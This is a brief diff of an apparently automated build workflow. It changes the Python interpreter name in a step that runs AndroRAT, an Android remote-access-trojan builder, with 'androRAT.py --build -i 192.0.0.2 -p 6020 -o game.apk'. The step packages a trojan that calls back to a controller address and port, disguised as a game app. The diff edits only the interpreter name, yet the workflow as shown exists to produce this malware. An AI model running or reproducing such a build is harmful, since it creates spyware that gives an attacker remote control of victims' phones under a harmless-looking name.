@@ -31,4 +31,4 @@ jobs:
     - name: Build APK
       run: |
         cd AndroRAT
-        python3 androRAT.py --build -i 192.0.0.2 -p 6020 -o game.apk
+        python androRAT.py --build -i 192.0.0.2 -p 6020 -o game.apk
